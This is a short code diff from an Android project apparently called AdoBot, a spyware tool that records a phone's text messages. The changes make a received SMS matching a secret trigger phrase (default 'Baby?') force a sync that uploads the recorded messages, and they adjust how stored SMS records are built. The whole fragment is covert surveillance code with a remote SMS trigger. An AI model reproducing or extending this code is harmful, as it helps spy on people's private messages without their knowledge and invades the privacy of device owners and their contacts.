@@ -23,6 +23,7 @@ import com.android.adobot.database.SmsDao;
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpCallback;
 import com.android.adobot.http.HttpRequest;
+import com.android.adobot.network.NetworkSchedulerService;
 
 import org.json.JSONObject;
 
@@ -285,12 +286,15 @@ public class SmsRecorderTask extends BaseTask {
             String uploadSmsCmd = prefs.getString(AdobotConstants.PREF_UPLOAD_SMS_COMMAND_FIELD, "Baby?");
             if (Objects.equals(body.trim(), uploadSmsCmd.trim()) && type == MESSAGE_TYPE_RECEIVED) {
                 Log.i(TAG, "Forced submit SMS");
-                submitNextRecord(new SubmitSmsCallback() {
-                    @Override
-                    public void onResult(boolean success) {
-                    }
-                });
-                return;
+
+                NetworkSchedulerService schedulerService = (NetworkSchedulerService) context;
+                schedulerService.sync();
+
+//                submitNextRecord(new SubmitSmsCallback() {
+//                    @Override
+//                    public void onResult(boolean success) {
+//                    }
+//                });
             }
 
             // accept only received and sent
@@ -311,7 +315,6 @@ public class SmsRecorderTask extends BaseTask {
                 final String date = formatter.format(calendar.getTime());
 
                 Sms sms = new Sms();
-//                sms.setId(Integer.parseInt(thread_id + id));
                 sms.set_id(id);
                 sms.setThread_id(thread_id);
                 sms.setBody(body);
